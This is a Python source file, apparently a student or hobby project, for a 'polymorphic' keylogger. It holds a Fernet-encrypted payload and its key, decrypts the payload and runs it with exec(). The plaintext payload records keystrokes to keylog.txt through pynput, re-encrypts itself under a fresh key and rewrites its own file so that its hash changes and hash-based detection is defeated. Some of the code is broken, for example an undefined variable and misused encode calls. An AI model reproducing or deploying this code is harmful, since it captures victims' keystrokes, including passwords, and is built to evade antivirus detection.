from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import inspect
import hashlib

def check_hash(): # Test to see if file hash has changed
    hash = hashlib.md5(open("pmorphic_keylogger.py", "rb").read()).hexdigest()
    print("File hash: ", hash)

def pmorphic(key, token, f):
    payload = f.decrypt(token).decode() # decrypt encrypted payload
    exec(payload)

#MAL
key = "7-FGjiPAW8s5ElOrRVw7Kc5LQCI85s0ibKvAGeq7TEI=" # Fernet.generate_key()
token = "gAAAAABnNtw45gu49nUBKGHSCTJwrT-M7z5yHPzFQWH5kN-kt5BisakVmTW3z4d-C2ODgFc5hDSsEdEsXNggQi5-yZ0ItbjovOPP1XcWP9OlO3YHG6_2-BOpDW0yw4B4lP5-1JLJ7QdosdTZosWLrGPCMxrUPJzDacR0GCxjmQljSh8dJvDxAhKRcSiALFV1m6afAXaqtSFtOP7wYqaBEb-WEG22xRUi9uhXEkvLuEhd3ebaI-rl0uU1E1tK0nOq-fRLnBjGnotGuf3DhEdQ4UtVmHqBhfZhsdjEZk2gs9qWWUdqX0pOwXAPuSrHthMzi_YwwdrQQeOnGpEQSaU4FRjB9LbWjDCWaxyojgzvQw-Ai_twi9kB2qE70EZ1uj6jMAlTAphAtIgsJtmWzt74fHkYF3Uin3d9FsFcV8A4FipZAz8Vh7rzoUIndCpesWz3YALySYeU3S4SQfgov1-RYALuNXP_HBKCTQTHK2DpDFy6mU2yX1Ojx58j0VhRt9W8J5TA3t68wEdOoIFaNm1WOhIuBfUbqyqqYpLGeGXkrlDd9MIlYhlWrh8eecr7PjjId_ocPP7HHsbuvctiiZCpx3siuChSI9MxSkd4JkJGT6wJXcTLu40J4i1pStaWuCVqPHen5iMRfgRopIaQIRGajRy9lf0VaJayEp-YdjOXfksEzQR2OUJauBcmOc6Fx22FsCW-VsOcDbYw_9O3NUHjTu9lMLtsqEzPh79F5EWH41-23gJMpUT0wmX8cz1vHxNgh8sVheDXfVukFftud6TLMgJV2WkuLtD7plfP9Q0eX8KvBzvZ3MNGSDhRhH20XNmMcf6AYNCFnq96XRB9ArUEUvXFpGC-Pjv-hywi9yTVllL3NwBAZx3NDzruqE_seURNx3GYWkSoLeZtzxx_QUBmcM0hXQZQ4qu3ih_WiM-ZYaO_bxzdhxrLr4aoUaC6Lwg1Y2SOfrGRoVj5_d0Rmq44wy79QugPM60R2HW6ZTquMKg9SyJbEB2T4r2t_eFgRPUGkmeMMrLGyQ2_UDSCSFECITX0OoE9BebusUNCrBBFkI9wQtCW8zO5ZxbCb45dyF3GRCxG3Q8TETWp1zzZhhImi5b_GSdUQK_DccXPBFCgl9wdU4djFvgKxR_CiVvEtS4DJhxaK5U2MLpwfqglo16kK9mhTITE8Ci4BQ=="
f = Fernet(key)

def gen_token():
    global key, f
    payload = """
def on_press(key):
    # record keystrokes
    file = open("keylog.txt", "a")
    file.write(str(key))

global token, f
mal = f.decrypt(token).decode()
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(mal).encode()

filename = os.path.basename(__file__)
lines = []
with open(fname, 'r') as newfile:
    lines = newfile.readlines()

with open('new', 'w') as newfile:
    for line in lines:
        if line.startswith('#MAL'):
            break
        newfile.write(line)
    newfile.write('#MAL\n')
    newfile.write('key = \"{}\"\n'.format(key.decode()))
    newfile.write('token = \"{}\"\n'.format(token.decode()))
    newfile.write('f = Fernet(key)')

os.remove(filename)
os.rename('new', filename)

print('operation complete')

with Listener(
    on_press=on_press
) as listener:
    listener.join()

file.close()
    """
    print(f.encrypt(payload.encode()))

#check_hash()
#pmorphic()
gen_token()

